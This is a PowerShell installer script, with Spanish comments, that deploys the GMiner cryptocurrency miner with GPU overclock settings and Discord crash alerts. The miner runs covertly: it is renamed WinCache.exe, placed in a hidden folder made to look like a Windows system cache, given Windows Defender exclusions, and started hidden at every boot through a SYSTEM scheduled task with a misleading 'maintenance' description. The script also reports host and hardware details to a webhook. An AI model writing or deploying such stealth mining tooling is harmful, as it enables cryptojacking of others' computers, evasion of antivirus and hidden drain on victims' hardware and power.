#Requires -Version 5.1
<#
.SYNOPSIS
    Deploys and runs GMiner from a hidden system folder using Task Scheduler.
    Includes optimized overclock profile and crash alerts.
.EXAMPLE
    .\Mine.ps1 -Wallet "YOUR_RVN_WALLET" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
.EXAMPLE
    .\Mine.ps1 -TestWebhook -DiscordWebhook "https://discord.com/api/webhooks/..."
.EXAMPLE
    .\Mine.ps1 -Diagnose
.EXAMPLE
    .\Mine.ps1 -Uninstall
#>
[CmdletBinding()]
param(
    [string]$Wallet,
    [string]$Pool,
    [string]$Algo = 'kawpow',
    [string]$Worker,
    [string]$DiscordWebhook,
    
    # --- Parámetros de Overclock (Optimizados para RTX 3050 / KawPow) ---
    [int]$PowerLimit    = 70,    # % de límite de potencia
    [int]$CoreClock     = 1455,  # MHz (frecuencia fija de núcleo)
    [int]$MemClock      = 1000,  # MHz (offset de memoria, para Windows)
    [int]$FanSpeed      = 75,    # % de velocidad del ventilador

    [switch]$Uninstall,
    [switch]$Foreground,
    [switch]$TestWebhook,
    [switch]$Diagnose,
    [switch]$Run,
    [switch]$NoElevate
)
$ErrorActionPreference = 'Stop'

# ---------- configuration & paths -------------------------------------------
$RemoteScriptUrl = 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1'

$Root     = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
$LogDir   = Join-Path $Root 'logs'
$ExePath  = Join-Path $Root 'WinCache.exe' # GMiner renombrado
$SelfPs   = Join-Path $Root 'WinCache.ps1'
$LogFile  = Join-Path $LogDir 'miner.log'
$TaskName = 'WinCacheAgent'

$scriptPath = $PSCommandPath
if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }

# ---------- helpers ---------------------------------------------------------
function Send-DiscordWebhook {
    param([string]$WebhookUrl, [string]$Title, [string]$Message, [int]$Color = 3066993)
    if ([string]::IsNullOrWhiteSpace($WebhookUrl)) { return $false }
    $payload = [ordered]@{
        embeds = @([ordered]@{ title = $Title; description = $Message; color = $Color; timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") })
    } | ConvertTo-Json -Depth 4 -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'application/json; charset=utf-8' -TimeoutSec 15 -ErrorAction Stop | Out-Null
        return $true
    } catch { Write-Warning "Webhook failed: $_"; return $false }
}

function Get-MiningHardware {
    try {
        $os  = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).Name
        $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 2)
        $gpus = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
        if ($cpu) { $cpu = $cpu.Trim() }
        if (-not $os) { $os = "Desconocido" }; if (-not $cpu) { $cpu = "Desconocido" }
        if ($gpus) { $gpuStr = $gpus -join ', ' } else { $gpuStr = "Ninguna detectada" }
        return "**OS:** $os`n**CPU:** $cpu`n**RAM:** $ram GB`n**GPU(s):** $gpuStr"
    } catch { return "Error al leer hardware: $_" }
}

function Check-ScriptUpdate {
    param([string]$LocalPath, [string]$RemoteUrl)
    try {
        $remoteContent = Invoke-RestMethod -Uri $RemoteUrl -TimeoutSec 10 -ErrorAction Stop
        if (-not (Test-Path $LocalPath)) { return "⚠️ Archivo local no existe." }
        $localContent = Get-Content -Path $LocalPath -Raw -ErrorAction Stop
        $normRemote = $remoteContent -replace "`r`n", "`n" -replace "`r", "`n"
        $normLocal  = $localContent  -replace "`r`n", "`n" -replace "`r", "`n"
        $sha = [System.Security.Cryptography.SHA256]::Create()
        try {
            $remoteHash = [System.BitConverter]::ToString($sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($normRemote)))
            $localHash  = [System.BitConverter]::ToString($sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($normLocal)))
        } finally { $sha.Dispose() }
        if ($remoteHash -eq $localHash) { return "✅ Al día (Idéntico a GitHub)" }
        else { return "⚠️ **Update disponible**: El script en GitHub es más reciente." }
    } catch { return "❓ No se pudo comprobar update" }
}

# ---------- test webhook ----------------------------------------------------
if ($TestWebhook) {
    if (-not $DiscordWebhook) { throw '-TestWebhook requiere -DiscordWebhook <url>' }
    Write-Host '[*] Enviando embed de prueba...'
    $ok = Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title '🧪 Test' -Message "Prueba desde $($env:COMPUTERNAME)" -Color 3447003
    if ($ok) { Write-Host '[+] Entregado.' } else { Write-Host '[-] Falló.' }
    return
}

# ---------- diagnose --------------------------------------------------------
if ($Diagnose) {
    function Section($t) { Write-Host ''; Write-Host "=== $t ===" -ForegroundColor Cyan }
    function Line($k, $v) { Write-Host ("  {0,-28} {1}" -f $k, $v) }

    Section 'Install path'
    Line 'Root'        $Root
    Line 'Exists'      (Test-Path $Root)
    Line 'WinCache.exe'(Test-Path $ExePath)
    Line 'miner.log'   $LogFile

    Section 'Scheduled Task'
    $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if ($task) { Line 'State' $task.State } else { Write-Host '  No hay tarea programada.' -ForegroundColor Yellow }

    Section 'Overclock Profile'
    Line 'Power Limit'    "$PowerLimit %"
    Line 'Core Clock'     "$CoreClock MHz"
    Line 'Memory Offset'  "+$MemClock MHz"
    Line 'Fan Speed'      "$FanSpeed %"

    Section 'Hardware'
    (Get-MiningHardware -replace '\*\*','') -split "`n" | ForEach-Object { Write-Host "  $_" }

    Section 'Script Update'
    Write-Host "  $(Check-ScriptUpdate -LocalPath $SelfPs -RemoteUrl $RemoteScriptUrl)" -ForegroundColor Yellow

    Section 'Processes'
    $miners = Get-Process WinCache -ErrorAction SilentlyContinue
    if ($miners) { foreach ($m in $miners) { Line "Miner PID $($m.Id)" "started=$($m.StartTime)" } } else { Write-Host '  Miner NO corriendo.' -ForegroundColor Yellow }

    Section 'Last 15 lines of miner.log'
    if (Test-Path $LogFile) { Get-Content $LogFile -Tail 15 | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  (No existe)' }
    Write-Host ''
    return
}

# ---------- elevation -------------------------------------------------------
if (-not $Run -and -not $NoElevate) {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = New-Object Security.Principal.WindowsPrincipal($id)
    if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $a = @('-NoProfile','-ExecutionPolicy','Bypass','-File', "`"$scriptPath`"")
        foreach ($k in $PSBoundParameters.Keys) {
            if ($k -eq 'NoElevate') { continue }
            $v = $PSBoundParameters[$k]
            if ($v -is [switch]) { if ($v) { $a += "-$k" } }
            else { if ("$v" -match '\s') { $a += @("-$k", "`"$v`"") } else { $a += @("-$k", "$v") } }
        }
        $a += '-NoElevate'
        Start-Process powershell -Verb RunAs -ArgumentList $a
        exit
    }
}

# ---------- uninstall -------------------------------------------------------
if ($Uninstall) {
    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -like '*WinCache.ps1*' } |
        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
    
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    
    try {
        Remove-MpPreference -ExclusionPath $Root -ErrorAction SilentlyContinue
        Remove-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction SilentlyContinue
    } catch {}
    
    Write-Host '[+] Detenido, tarea eliminada y exclusiones limpiadas.'
    return
}

# ---------- watcher mode ----------------------------------------------------
if ($Run) {
    New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
    if (-not $Wallet -or -not $Pool -or -not $Algo) { exit 1 }

    function Write-Session {
        param([string]$Msg, [string]$Level = 'INFO')
        Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Msg" -Encoding UTF8
    }

    # Argumentos de GMiner con Overclock
    $argStr = "--algo $Algo --server $Pool --user $Wallet.$Worker --pl $PowerLimit --lock_cclock $CoreClock --mclock $MemClock --fan $FanSpeed"

    Write-Session "===== watcher iniciado (pid $PID) ====="
    Write-Session "exe=$ExePath  pool=$Pool  algo=$Algo  worker=$Worker"
    Write-Session "OC -> PL: $PowerLimit% | Core: $CoreClock MHz | Mem: +$MemClock MHz | Fan: $FanSpeed%"

    $restarts = 0
    $notifiedStart = $false

    while ($true) {
        Write-Session "lanzando minero (intento $($restarts + 1))"
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName               = $ExePath
        $psi.Arguments              = $argStr
        $psi.WorkingDirectory       = $Root
        $psi.UseShellExecute        = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError  = $true
        $psi.CreateNoWindow         = $true
        $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
        $psi.StandardErrorEncoding  = [System.Text.Encoding]::UTF8
        $proc = New-Object System.Diagnostics.Process
        $proc.StartInfo = $psi
        
        $lastOutput = "Sin output registrado."
        
        try {
            $proc.Start() | Out-Null
            if (-not $notifiedStart -and $DiscordWebhook) {
                $hwInfo = Get-MiningHardware
                $updateStatus = Check-ScriptUpdate -LocalPath $SelfPs -RemoteUrl $RemoteScriptUrl
                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`n`n**OC:** PL $PowerLimit% | Core $CoreClock MHz | Mem +$MemClock MHz | Fan $FanSpeed%`n`n**Hardware:**`n$hwInfo`n`n**Script:** $updateStatus"
                Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Minero Iniciado (OC)" -Message $msg -Color 3066993 | Out-Null
                $notifiedStart = $true
            }
        } catch {
            Write-Session "Fallo al iniciar: $_" 'FATAL'
            break
        }

        $q = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
        $subOut = Register-ObjectEvent -InputObject $proc -EventName OutputDataReceived -Action {
            if ($null -ne $EventArgs.Data) { $Event.MessageData.Enqueue($EventArgs.Data) }
        } -MessageData $q
        $subErr = Register-ObjectEvent -InputObject $proc -EventName ErrorDataReceived -Action {
            if ($null -ne $EventArgs.Data) { $Event.MessageData.Enqueue($EventArgs.Data) }
        } -MessageData $q

        $proc.BeginOutputReadLine()
        $proc.BeginErrorReadLine()
        $writer = [System.IO.StreamWriter]::new($LogFile, $true, [System.Text.Encoding]::UTF8)
        $writer.AutoFlush = $true

        while (-not $proc.HasExited -or -not $q.IsEmpty) {
            $line = $null
            if ($q.TryDequeue([ref]$line)) {
                $writer.WriteLine("$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [INFO] $line")
                # Guardamos la última línea para enviarla en caso de error
                if (-not [string]::IsNullOrWhiteSpace($line)) { $lastOutput = $line }
            } else { Start-Sleep -Milliseconds 200 }
        }

        $proc.WaitForExit()
        $exitCode = $proc.ExitCode
        $writer.Close()
        Unregister-Event -SourceIdentifier $subOut.Name -ErrorAction SilentlyContinue
        Unregister-Event -SourceIdentifier $subErr.Name -ErrorAction SilentlyContinue
        $proc.Dispose()

        Write-Session "minero cerrado (code $exitCode)" 'WARN'
        
        # --- ALERTA DE CAÍDA ---
        if ($DiscordWebhook) {
            $alertMsg = "El minero se ha detenido inesperadamente.`n`n**Host:** $($env:COMPUTERNAME)`n**Exit Code:** $exitCode`n**Último log:** ``$lastOutput```n`n*Reiniciando en 30 segundos (Intento $($restarts + 1)/10)...*"
            Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "⚠️ Alerta: Minero Caído" -Message $alertMsg -Color 15158332 | Out-Null
        }

        $restarts++
        if ($restarts -ge 10) {
            Write-Session "Max reinicios alcanzados" 'FATAL'
            # --- ALERTA FATAL (LÍMITE ALCANZADO) ---
            if ($DiscordWebhook) {
                $fatalMsg = "El minero ha superado el límite de 10 reinicios seguidos.`n`n**Host:** $($env:COMPUTERNAME)`nEl proceso se ha detenido por completo. Revisa los logs locales."
                Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "🛑 FATAL: Minero Detenido Definitivamente" -Message $fatalMsg -Color 10038562 | Out-Null
            }
            break
        }
        
        Start-Sleep -Seconds 30
    }
    exit 0
}

# ---------- folders ---------------------------------------------------------
foreach ($d in @($Root, $LogDir)) {
    if (-not (Test-Path $d)) { New-Item -ItemType Directory -Force -Path $d | Out-Null }
}
try {
    $item = Get-Item $Root -Force
    if (-not ($item.Attributes -band [System.IO.FileAttributes]::Hidden)) { $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden }
} catch {}

# ---------- Defender exclusions ---------------------------------------------
try {
    $mp = Get-MpPreference -ErrorAction Stop
    if (@($mp.ExclusionPath) -notcontains $Root) { Add-MpPreference -ExclusionPath $Root }
    if (@($mp.ExclusionProcess) -notcontains 'WinCache.exe') { Add-MpPreference -ExclusionProcess 'WinCache.exe' }
} catch {}

# ---------- GMiner fetch ----------------------------------------------------
if (-not (Test-Path $ExePath)) {
    Write-Host '[*] Descargando GMiner (windows64, latest release)...'
    $api = 'https://api.github.com/repos/develsoftware/GMinerRelease/releases/latest'
    $rel = Invoke-RestMethod -Uri $api -Headers @{ 'User-Agent' = 'PowerShell' }
    $asset = $rel.assets | Where-Object { $_.name -match 'windows64\.zip$' } | Select-Object -First 1
    if (-not $asset) { throw 'No se encontró el asset windows64.' }
    
    $tmp   = Join-Path $env:TEMP ('gm-{0}.zip' -f ([guid]::NewGuid().ToString('N')))
    $stage = Join-Path $env:TEMP ('gm-{0}'     -f ([guid]::NewGuid().ToString('N')))
    
    Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $tmp -UseBasicParsing
    Expand-Archive -Path $tmp -DestinationPath $stage -Force
    
    $inner = Get-ChildItem $stage -Recurse -Filter 'miner.exe' | Select-Object -First 1
    if (-not $inner) { throw 'miner.exe no encontrado en el zip.' }
    
    Copy-Item $inner.FullName $ExePath -Force
    Remove-Item $tmp, $stage -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Instalado como $ExePath"
}

# ---------- worker hash -----------------------------------------------------
if ([string]::IsNullOrWhiteSpace($Worker)) {
    $sha = [System.Security.Cryptography.SHA256]::Create()
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)
        $hash  = $sha.ComputeHash($bytes)
    } finally { $sha.Dispose() }
    $Worker = "rig_$([System.BitConverter]::ToString($hash).Replace('-','').Substring(0,6).ToLower())"
}

# ---------- install self ----------------------------------------------------
if ($scriptPath -ne $SelfPs) {
    Copy-Item $scriptPath $SelfPs -Force
    Unblock-File $SelfPs -ErrorAction SilentlyContinue
    $head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
    if ($head -notmatch '^#Requires') { Remove-Item $SelfPs -Force; throw "Archivo corrupto." }
    Write-Host "[+] Instalado $SelfPs"
}

# ---------- scheduled task --------------------------------------------------
Write-Host '[*] Registrando tarea programada con OC...'
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

$argList = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Wallet `"$Wallet`" -Pool `"$Pool`" -Algo `"$Algo`" -Worker `"$Worker`" -PowerLimit $PowerLimit -CoreClock $CoreClock -MemClock $MemClock -FanSpeed $FanSpeed"
if ($DiscordWebhook) { $argList += " -DiscordWebhook `"$DiscordWebhook`"" }
$argList += " -Run -NoElevate"

$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $argList
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Description "Mantenimiento en segundo plano de WinCache" | Out-Null
Write-Host "[+] Tarea programada instalada."

# ---------- launch watcher (ahora) ------------------------------------------
Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
$p = $null
if ($Foreground) {
    & $SelfPs -Run -NoElevate -Wallet $Wallet -Pool $Pool -Algo $Algo -Worker $Worker -DiscordWebhook $DiscordWebhook -PowerLimit $PowerLimit -CoreClock $CoreClock -MemClock $MemClock -FanSpeed $FanSpeed
} else {
    $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $argList -WindowStyle Hidden -PassThru
    Write-Host "[+] Watcher iniciado (pid $($p.Id))"
}

# ---------- notify summary --------------------------------------------------
if ($DiscordWebhook) {
    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`n**OC:** PL $PowerLimit% | Core $CoreClock MHz | Mem +$MemClock MHz | Fan $FanSpeed%`nWatcher PID: $($p.Id)"
    Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Instalación Completada (OC)" -Message $msg -Color 3066993 | Out-Null
}

Write-Host ''
Write-Host '=================================================='
Write-Host '  GMiner en background con Overclock. Alertas activas.'
Write-Host "  Install : $Root"
Write-Host "  Log     : $LogFile"
Write-Host "  OC      : PL $PowerLimit% | Core $CoreClock MHz | Mem +$MemClock MHz | Fan $FanSpeed%"
Write-Host '=================================================='